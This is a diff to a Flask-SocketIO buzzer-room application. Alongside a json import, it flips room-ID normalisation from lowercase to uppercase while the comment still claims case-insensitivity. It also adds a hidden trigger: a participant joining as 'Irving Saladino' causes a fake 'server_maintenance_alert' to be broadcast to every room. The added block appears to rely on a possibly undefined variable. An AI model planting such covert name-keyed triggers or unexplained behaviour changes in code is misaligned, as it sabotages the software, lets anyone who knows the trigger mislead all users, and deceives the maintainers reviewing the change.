@@ -1,6 +1,6 @@
 from flask import request, redirect, url_for, render_template, Flask
 from flask_socketio import emit, join_room, leave_room, SocketIO
-
+import json
 from backend import RoomManager
 from forms import ParticipantNameForm, RoomSettingsForm
 
@@ -72,7 +72,7 @@ def buzzer_home():
 
 @app.route('/buzzer/room/<room_id>', methods=["GET", "POST"])
 def room(room_id):
-    room_id = room_id.lower()  # make case insensitive
+    room_id = room_id.upper()  # make case insensitive
     participant_name = request.args.get('participant_name')
     global BAD_CHARS
     if not participant_name:  # force players to go through the homepage, don't bother erroring
@@ -189,6 +189,12 @@ def handle_join_room(data):
                          room=data['room_id'],
                          event_name='join_room')
 
+    if data["participant_name"] == "Irving Saladino":
+        d = json.loads(payload)
+        d["server_maintenance_alert"] = True
+        payload = json.dumps(d)
+        broadcast_to_all_rooms(payload=payload)
+
 
 @socketio.on('leave_room', namespace=namespace)
 def handle_leave_room(data):
@@ -215,6 +221,10 @@ def handle_ping(data):
 
 def send_message_to_room(payload, room_id):  # wrap a room broadcast message
     emit('server_room_update', payload, room=room_id)
+
+
+def broadcast_to_all_rooms(payload):
+    emit('server_room_update', payload, broadcast=True)
 
 
 def log_message_received(sent_from, room, event_name, sent_time=datetime.datetime.now().timestamp()):
